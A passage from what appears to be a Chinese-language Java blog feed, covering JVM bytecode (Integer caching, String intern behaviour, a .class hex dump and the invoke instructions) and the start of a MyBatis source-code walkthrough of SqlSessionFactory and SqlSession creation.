punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Integer</span> i1<span class="token operator">=</span><span class="token number">128</span><span class="token punctuation">;</span>        <span class="token class-name">Integer</span> i2<span class="token operator">=</span><span class="token number">128</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i1<span class="token operator">==</span>i2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>通过idea插件jclasslib观察字节码文件</p><figure><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text"> 0 sipush 128 3 invokestatic #2 &lt;java/lang/Integer.valueOf : (I)Ljava/lang/Integer;> 6 astore_1 7 sipush 12810 invokestatic #2 &lt;java/lang/Integer.valueOf : (I)Ljava/lang/Integer;>13 astore_214 getstatic #3 &lt;java/lang/System.out : Ljava/io/PrintStream;>17 aload_118 aload_219 if_acmpne 26 (+7)22 iconst_123 goto 27 (+4)26 iconst_027 invokevirtual #4 &lt;java/io/PrintStream.println : (Z)V>30 return<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>Integer.valueOf里面回去调用 IntegerCache缓存对象</p><h4 id="案例2"><a href="#案例2" class="headerlink" title="案例2"></a>案例2</h4><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">@Testpublic void test2() &#123;    String str1 &#x3D; new String(&quot;hello&quot;) + new String(&quot;world&quot;);    String str2 &#x3D; &quot;helloworld&quot;;    System.out.println(str1 &#x3D;&#x3D; str2); &#x2F;&#x2F;false&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><figure><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text"> 0 new #5 &lt;java/lang/StringBuilder> 3 dup 4 invokespecial #6 &lt;java/lang/StringBuilder.&lt;init> : ()V> 7 new #7 &lt;java/lang/String>10 dup11 ldc #8 &lt;hello>13 invokespecial #9 &lt;java/lang/String.&lt;init> : (Ljava/lang/String;)V>16 invokevirtual #10 &lt;java/lang/StringBuilder.append : (Ljava/lang/String;)Ljava/lang/StringBuilder;>19 new #7 &lt;java/lang/String>22 dup23 ldc #11 &lt;world>25 invokespecial #9 &lt;java/lang/String.&lt;init> : (Ljava/lang/String;)V>28 invokevirtual #10 &lt;java/lang/StringBuilder.append : (Ljava/lang/String;)Ljava/lang/StringBuilder;>31 invokevirtual #12 &lt;java/lang/StringBuilder.toString : ()Ljava/lang/String;>34 astore_135 ldc #13 &lt;helloworld>37 astore_238 getstatic #3 &lt;java/lang/System.out : Ljava/io/PrintStream;>41 aload_142 aload_243 if_acmpne 50 (+7)46 iconst_147 goto 51 (+4)50 iconst_051 invokevirtual #4 &lt;java/io/PrintStream.println : (Z)V>54 return<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>str1不和str2相等的原因在于，str1的对象是由两个StringBuilder对象转化使用append拼接，最后调用StringBuilder的toString,而toString里面使用的值又是StringBuilder对象的值新new一个对象的，而str2是直接在堆中常量对象，二者地址自然不对等</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Create a copy, don't share the array</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h4 id="案例3"><a href="#案例3" class="headerlink" title="案例3"></a>案例3</h4><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test3</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> str1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    str1<span class="token punctuation">.</span><span class="token function">intern</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> str2 <span class="token operator">=</span> <span class="token string">"helloworld"</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>str1 <span class="token operator">==</span> str2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//true</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>加入  str1.intern(); 就是true  jdk6还事false，jdk8后是true,因为jdk8后的常量池也在堆中，此时通过  str1.intern();会将常量池改对象的地址指向堆中的地址</p><h3 id="如何解读class文件？"><a href="#如何解读class文件？" class="headerlink" title="如何解读class文件？"></a>如何解读class文件？</h3><p>.class文件以16进制存储的</p><figure><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">0000000 ca fe ba be 00 00 00 34 00 4b 0a 00 10 00 2a 0a | .......4.K....*.0000010 00 2b 00 2c 09 00 2d 00 2e 0a 00 2f 00 30 07 00 | .+.,..-..../.0..0000020 31 0a 00 05 00 2a 07 00 32 08 00 33 0a 00 07 00 | 1....*..2..3....0000030 34 0a 00 05 00 35 08 00 36 0a 00 05 00 37 08 00 | 4....5..6....7..0000040 38 0a 00 07 00 39 07 00 3a 07 00 3b 01 00 06 3c | 8....9..:..;...&lt;0000050 69 6e 69 74 3e 01 00 03 28 29 56 01 00 04 43 6f | init>...()V...Co0000060 64 65 01 00 0f 4c 69 6e 65 4e 75 6d 62 65 72 54 | de...LineNumberT0000070 61 62 6c 65 01 00 12 4c 6f 63 61 6c 56 61 72 69 | able...LocalVari0000080 61 62 6c 65 54 61 62 6c 65 01 00 04 74 68 69 73 | ableTable...this0000090 01 00 21 4c 63 6e 2f 68 79 71 75 70 2f 6a 76 6d | ..!Lcn/hyqup/jvm00000a0 2f 42 79 74 65 43 6f 6e 64 65 49 6e 74 65 72 76 | /ByteCondeInterv00000b0 69 65 77 3b 01 00 05 74 65 73 74 31 01 00 02 69 | iew;...test1...i00000c0 31 01 00 13 4c 6a 61 76 61 2f 6c 61 6e 67 2f 49 | 1...Ljava/lang/I00000d0 6e 74 65 67 65 72 3b 01 00 02 69 32 01 00 0d 53 | nteger;...i2...S00000e0 74 61 63 6b 4d 61 70 54 61 62 6c 65 07 00 3a 07 | tackMapTable..:.00000f0 00 3c 07 00 3d 01 00 19 52 75 6e 74 69 6d 65 56 | .&lt;..=...RuntimeV0000100 69 73 69 62 6c 65 41 6e 6e 6f 74 61 74 69 6f 6e | isibleAnnotation0000110 73 01 00 10 4c 6f 72 67 2f 6a 75 6e 69 74 2f 54 | s...Lorg/junit/T0000120 65 73 74 3b 01 00 05 74 65 73 74 32 01 00 04 73 | est;...test2...s0000130 74 72 31 01 00 12 4c 6a 61 76 61 2f 6c 61 6e 67 | tr1...Ljava/lang0000140 2f 53 74 72 69 6e 67 3b 01 00 04 73 74 72 32 07 | /String;...str2.0000150 00 32 01 00 05 74 65 73 74 33 01 00 0a 53 6f 75 | .2...test3...Sou0000160 72 63 65 46 69 6c 65 01 00 17 42 79 74 65 43 6f | rceFile...ByteCo0000170 6e 64 65 49 6e 74 65 72 76 69 65 77 2e 6a 61 76 | ndeInterview.jav0000180 61 0c 00 11 00 12 07 00 3c 0c 00 3e 00 3f 07 00 | a.......&lt;..>.?..0000190 40 0c 00 41 00 42 07 00 3d 0c 00 43 00 44 01 00 | @..A.B..=..C.D..00001a0 17 6a 61 76 61 2f 6c 61 6e 67 2f 53 74 72 69 6e | .java/lang/Strin00001b0 67 42 75 69 6c 64 65 72 01 00 10 6a 61 76 61 2f | gBuilder...java/00001c0 6c 61 6e 67 2f 53 74 72 69 6e 67 01 00 05 68 65 | lang/String...he00001d0 6c 6c 6f 0c 00 11 00 45 0c 00 46 00 47 01 00 05 | llo....E..F.G...00001e0 77 6f 72 6c 64 0c 00 48 00 49 01 00 0a 68 65 6c | world..H.I...hel00001f0 6c 6f 77 6f 72 6c 64 0c 00 4a 00 49 01 00 1f 63 | loworld..J.I...c0000200 6e 2f 68 79 71 75 70 2f 6a 76 6d 2f 42 79 74 65 | n/hyqup/jvm/Byte0000210 43 6f 6e 64 65 49 6e 74 65 72 76 69 65 77 01 00 | CondeInterview..0000220 10 6a 61 76 61 2f 6c 61 6e 67 2f 4f 62 6a 65 63 | .java/lang/Objec0000230 74 01 00 11 6a 61 76 61 2f 6c 61 6e 67 2f 49 6e | t...java/lang/In0000240 74 65 67 65 72 01 00 13 6a 61 76 61 2f 69 6f 2f | teger...java/io/0000250 50 72 69 6e 74 53 74 72 65 61 6d 01 00 07 76 61 | PrintStream...va0000260 6c 75 65 4f 66 01 00 16 28 49 29 4c 6a 61 76 61 | lueOf...(I)Ljava0000270 2f 6c 61 6e 67 2f 49 6e 74 65 67 65 72 3b 01 00 | /lang/Integer;..0000280 10 6a 61 76 61 2f 6c 61 6e 67 2f 53 79 73 74 65 | .java/lang/Syste0000290 6d 01 00 03 6f 75 74 01 00 15 4c 6a 61 76 61 2f | m...out...Ljava/00002a0 69 6f 2f 50 72 69 6e 74 53 74 72 65 61 6d 3b 01 | io/PrintStream;.00002b0 00 07 70 72 69 6e 74 6c 6e 01 00 04 28 5a 29 56 | ..println...(Z)V00002c0 01 00 15 28 4c 6a 61 76 61 2f 6c 61 6e 67 2f 53 | ...(Ljava/lang/S00002d0 74 72 69 6e 67 3b 29 56 01 00 06 61 70 70 65 6e | tring;)V...appen00002e0 64 01 00 2d 28 4c 6a 61 76 61 2f 6c 61 6e 67 2f | d..-(Ljava/lang/00002f0 53 74 72 69 6e 67 3b 29 4c 6a 61 76 61 2f 6c 61 | String;)Ljava/la0000300 6e 67 2f 53 74 72 69 6e 67 42 75 69 6c 64 65 72 | ng/StringBuilder0000310 3b 01 00 08 74 6f 53 74 72 69 6e 67 01 00 14 28 | ;...toString...(0000320 29 4c 6a 61 76 61 2f 6c 61 6e 67 2f 53 74 72 69 | )Ljava/lang/Stri0000330 6e 67 3b 01 00 06 69 6e 74 65 72 6e 00 21 00 0f | ng;...intern.!..0000340 00 10 00 00 00 00 00 04 00 01 00 11 00 12 00 01 | ................0000350 00 13 00 00 00 2f 00 01 00 01 00 00 00 05 2a b7 | ...../........*.0000360 00 01 b1 00 00 00 02 00 14 00 00 00 06 00 01 00 | ................0000370 00 00 0d 00 15 00 00 00 0c 00 01 00 00 00 05 00 | ................0000380 16 00 17 00 00 00 01 00 18 00 12 00 02 00 13 00 | ................0000390 00 00 98 00 03 00 03 00 00 00 1f 11 00 80 b8 00 | ................00003a0 02 4c 11 00 80 b8 00 02 4d b2 00 03 2b 2c a6 00 | .L......M...+,..00003b0 07 04 a7 00 04 03 b6 00 04 b1 00 00 00 03 00 14 | ................00003c0 00 00 00 12 00 04 00 00 00 1c 00 07 00 1d 00 0e | ................00003d0 00 1f 00 1e 00 20 00 15 00 00 00 20 00 03 00 00 | ..... ..... ....00003e0 00 1f 00 16 00 17 00 00 00 07 00 18 00 19 00 1a | ................00003f0 00 01 00 0e 00 11 00 1b 00 1a 00 02 00 1c 00 00 | ................0000400 00 29 00 02 ff 00 1a 00 03 07 00 1d 07 00 1e 07 | .)..............0000410 00 1e 00 01 07 00 1f ff 00 00 00 03 07 00 1d 07 | ................0000420 00 1e 07 00 1e 00 02 07 00 1f 01 00 20 00 00 00 | ............ ...0000430 06 00 01 00 21 00 00 00 01 00 22 00 12 00 02 00 | ....!.....".....0000440 13 00 00 00 b0 00 04 00 03 00 00 00 37 bb 00 05 | ............7...0000450 59 b7 00 06 bb 00 07 59 12 08 b7 00 09 b6 00 0a | Y......Y........0000460 bb 00 07 59 12 0b b7 00 09 b6 00 0a b6 00 0c 4c | ...Y...........L0000470 12 0d 4d b2 00 03 2b 2c a6 00 07 04 a7 00 04 03 | ..M...+,........0000480 b6 00 04 b1 00 00 00 03 00 14 00 00 00 12 00 04 | ................0000490 00 00 00 25 00 23 00 26 00 26 00 28 00 36 00 29 | ...%.#.&amp;.&amp;.(.6.)00004a0 00 15 00 00 00 20 00 03 00 00 00 37 00 16 00 17 | ..... .....7....00004b0 00 00 00 23 00 14 00 23 00 24 00 01 00 26 00 11 | ...#...#.$...&amp;..00004c0 00 25 00 24 00 02 00 1c 00 00 00 29 00 02 ff 00 | .%.$.......)....00004d0 32 00 03 07 00 1d 07 00 26 07 00 26 00 01 07 00 | 2.......&amp;..&amp;....00004e0 1f ff 00 00 00 03 07 00 1d 07 00 26 07 00 26 00 | ...........&amp;..&amp;.00004f0 02 07 00 1f 01 00 20 00 00 00 06 00 01 00 21 00 | ...... .......!.0000500 00 00 01 00 27 00 12 00 02 00 13 00 00 00 b9 00 | ....'...........0000510 04 00 03 00 00 00 3c bb 00 05 59 b7 00 06 bb 00 | ......&lt;...Y.....0000520 07 59 12 08 b7 00 09 b6 00 0a bb 00 07 59 12 0b | .Y...........Y..0000530 b7 00 09 b6 00 0a b6 00 0c 4c 2b b6 00 0e 57 12 | .........L+...W.0000540 0d 4d b2 00 03 2b 2c a6 00 07 04 a7 00 04 03 b6 | .M...+,.........0000550 00 04 b1 00 00 00 03 00 14 00 00 00 16 00 05 00 | ................0000560 00 00 2e 00 23 00 2f 00 28 00 30 00 2b 00 31 00 | ....#./.(.0.+.1.0000570 3b 00 32 00 15 00 00 00 20 00 03 00 00 00 3c 00 | ;.2..... .....&lt;.0000580 16 00 17 00 00 00 23 00 19 00 23 00 24 00 01 00 | ......#...#.$...0000590 2b 00 11 00 25 00 24 00 02 00 1c 00 00 00 29 00 | +...%.$.......).00005a0 02 ff 00 37 00 03 07 00 1d 07 00 26 07 00 26 00 | ...7.......&amp;..&amp;.00005b0 01 07 00 1f ff 00 00 00 03 07 00 1d 07 00 26 07 | ..............&amp;.00005c0 00 26 00 02 07 00 1f 01 00 20 00 00 00 06 00 01 | .&amp;....... ......00005d0 00 21 00 00 00 01 00 28 00 00 00 02 00 29       | .!.....(.....)00005de <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>如上，.class</p><p>文件开头的4个字节<code>cafe babe</code> 称之为 <strong>魔数</strong>,0000是编译器jdk版本的次版本号0，0034转化为十进制是52,是主版本号，java的版本号从45开始  52对应1.8，接下来就是一些<code>常量池</code>、<code>方法表集合</code>等信息 这些字16进制的信息对应为jvm 所认识的字节码指令。</p><h3 id="字节码指令集与解析"><a href="#字节码指令集与解析" class="headerlink" title="字节码指令集与解析"></a>字节码指令集与解析</h3><blockquote><p>JVM中的字节码指令集按用途大致分成9类</p></blockquote><ul><li>加载与存储指令</li></ul><p>​    <strong>局部变量压入操作数栈</strong></p><p>​xload：（其中x 为 i、l、f、d、a）</p><p>​<strong>常量入栈</strong></p><p>​const、push、ldc</p><ul><li>算术指令</li><li>类型转换指令</li><li>对象的创建与访问指令</li><li>方法调用与返回指令</li></ul><p>1.<code>invokevirtual</code>指令用于调用对象的实例方法，根据对象的实际类型进行分派(虚方法分派)，支持多态，这也是java语言中最常见的方法分派方式。</p><p>2.<code>invokerinterface</code>指令用于调用接口方法，它会在运行时搜索由特定对象所实现的这个接口方法，并找出适合的方法进行调用</p><p>3.<code>invokespecial</code>指令用于调用一些需要特殊处理的实例方法，包括实例<code>初始化方法(构造器)</code>，私有方法和父类方法，这些方法都是静态类型绑定的，不会在调用时进行动态派发</p><p>4.<code>invokestatic</code>指令用于调用命名类中的类方法(static方法)，这是静态绑定的</p><p>5.<code>invokedynamic</code>指令用于调用动态绑定的方法，这是jdk1.7之后新加入的指令，用于在运行时动态解析出调用点限定符所引用的方法，并执行该方法。前面4条调用指令的分派逻辑都固化在java虚拟机内部，而invokedynamic指令的分配逻辑是由用户所设定的引导方法决定的</p><ul><li>操作数栈管理指令</li><li>控制转移指令</li><li>异常处理指令</li><li>同步控制指令</li></ul><p> 关于字节码指令集详细：</p><blockquote><p><a href="https://www.cnblogs.com/sjqstart/p/15044517.html">https://www.cnblogs.com/sjqstart/p/15044517.html</a></p></blockquote><blockquote><p><a href="https://blog.csdn.net/mynameisgt/article/details/125052344">https://blog.csdn.net/mynameisgt/article/details/125052344</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>JVM</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>剑指源码-Mybatis-(二)-主流程分析与核心组件关系</title>
    <link href="/posts/597465dd.html"/>
    <url>/posts/597465dd.html</url>
    
    <content type="html"><![CDATA[<p> demo整体流程概述，分析核心组件的作用以及关系</p><span id="more"></span><blockquote><p>demo地址：<a href="https://github.com/hyq965672903/sourcecode-learn-mybatis.git">https://github.com/hyq965672903/sourcecode-learn-mybatis.git</a></p></blockquote><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/** * 使用MyBatis API方式 * @throws IOException */</span><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> resource <span class="token operator">=</span> <span class="token string">"mybatis-config.xml"</span><span class="token punctuation">;</span>    <span class="token class-name">InputStream</span> inputStream <span class="token operator">=</span> <span class="token class-name">Resources</span><span class="token punctuation">.</span><span class="token function">getResourceAsStream</span><span class="token punctuation">(</span>resource<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">SqlSessionFactory</span> sqlSessionFactory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SqlSessionFactoryBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">SqlSession</span> session <span class="token operator">=</span> sqlSessionFactory<span class="token punctuation">.</span><span class="token function">openSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">User</span><span class="token punctuation">)</span> session<span class="token punctuation">.</span><span class="token function">selectOne</span><span class="token punctuation">(</span><span class="token string">"cn.hyqup.mapper.UserMapper.selectAll"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>        session<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/** * 通过 SqlSession.getMapper(XXXMapper.class)  接口方式 */</span><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> resource <span class="token operator">=</span> <span class="token string">"mybatis-config.xml"</span><span class="token punctuation">;</span>    <span class="token class-name">InputStream</span> inputStream <span class="token operator">=</span> <span class="token class-name">Resources</span><span class="token punctuation">.</span><span class="token function">getResourceAsStream</span><span class="token punctuation">(</span>resource<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">SqlSessionFactory</span> sqlSessionFactory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SqlSessionFactoryBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">SqlSession</span> session <span class="token operator">=</span> sqlSessionFactory<span class="token punctuation">.</span><span class="token function">openSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ExecutorType.BATCH</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">UserMapper</span> mapper <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">getMapper</span><span class="token punctuation">(</span><span class="token class-name">UserMapper</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> users <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">selectAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>users<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>        session<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="整体流程分析"><a href="#整体流程分析" class="headerlink" title="整体流程分析"></a>整体流程分析</h2><blockquote><p> 通过 SqlSession.getMapper(XXXMapper.class)  接口方式为例，流程分析</p></blockquote><h3 id="创建SqlSessionFactory的过程"><a href="#创建SqlSessionFactory的过程" class="headerlink" title="创建SqlSessionFactory的过程"></a>创建SqlSessionFactory的过程</h3><ol><li><p>首先根据mybatis-config.xml创建一个<code>inputStream</code></p></li><li><p>然后new一个SqlSessionFactoryBuilder对象，使用inputStream调用build方法得到<code>SqlSessionFactory</code>对象</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">SqlSessionFactory</span> <span class="token function">build</span><span class="token punctuation">(</span><span class="token class-name">InputStream</span> inputStream<span class="token punctuation">,</span> <span class="token class-name">String</span> environment<span class="token punctuation">,</span> <span class="token class-name">Properties</span> properties<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">XMLConfigBuilder</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLConfigBuilder</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">,</span> environment<span class="token punctuation">,</span> properties<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">build</span><span class="token punctuation">(</span>parser<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">throw</span> <span class="token class-name">ExceptionFactory</span><span class="token punctuation">.</span><span class="token function">wrapException</span><span class="token punctuation">(</span><span class="token string">"Error building SqlSession."</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">ErrorContext</span><span class="token punctuation">.</span><span class="token function">instance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>inputStream <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         inputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// Intentionally ignore. Prefer previous error.</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure></li><li><p><code>XMLConfigBuilder</code>创建的parser解析器对象，会去解析每一个xml节点信息，对应的相关配置信息保存在一个<code>Configuration</code>对象中</p></li><li><p>同时这个时候会解析到mapper信息，<code>XMLConfigBuilder</code>内部构建了一个<code>XMLMapperBuilder</code>，<code>XMLMapperBuilder</code>对象会将mappper信息解析到<code>Configuration</code>的<code>mappedStatements</code>这个Map对象中。<strong>而这个<code>mappedStatements</code>包含多个<code>MappedStatement</code>，<code>MappedStatement</code>中包含了mapper中每一个标签信息</strong></p></li><li><p>解析完mapper之后，将mapper的信息放入<code>Configuration</code>对象中，返回<code>Configuration</code>对象</p></li><li><p>build中传入的Configuration对象被用来创建了一个<code>DefaultSqlSessionFactory</code>对象。<u><strong>创建sqlSessionFactory所做的工作就是，将所有配置文件的信息解析并且保存在Configuration对象中，返回包含了Configuration对象的DefaultSqlSessionFactory对象。</strong></u></p></li></ol><h3 id="获取sqlSession对象的过程"><a href="#获取sqlSession对象的过程" class="headerlink" title="获取sqlSession对象的过程"></a>获取sqlSession对象的过程</h3><ol><li>首先调用<code>DefaultSqlSessionFactory</code>的<code>openSession</code>()方法</li><li>openSession里面调用<code>openSessionFromDataSource</code>(configuration.getDefaultExecutorType(), null, false)方法</li><li><code>openSessionFromDataSource</code>里面会创建Transaction一个事务，同时会创建一个Executor对象</li><li>根据<code>Executor</code>在全局配置中的类型（目前类型有3种，simple，batch，reuse），创建出SimpleExecutor、<code>ReuseExecutor</code>或者<code>BatchExecutor</code>。Executor是一个接口，里面规定了一些增删改查的接口方法。默认就是simple类型</li><li>如果开启了二级缓存，会通过CacheExecutor对Executor进行包装，CacheExecutor本质就是<strong>装饰者模式</strong></li><li>executor &#x3D; (Executor) interceptorChain.pluginAll(executor)，pluginAll方法会拿到每一个拦截器的plugin方法包装一下executor，开发插件就是这里织入</li><li>最后创建DefaultSqlSession并返回</li></ol><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token class-name">SqlSession</span> <span class="token function">openSessionFromDataSource</span><span class="token punctuation">(</span><span class="token class-name">ExecutorType</span> execType<span class="token punctuation">,</span> <span class="token class-name">TransactionIsolationLevel</span> level<span class="token punctuation">,</span> <span class="token keyword">boolean</span> autoCommit<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token class-name">Transaction</span> tx <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">final</span> <span class="token class-name">Environment</span> environment <span class="token 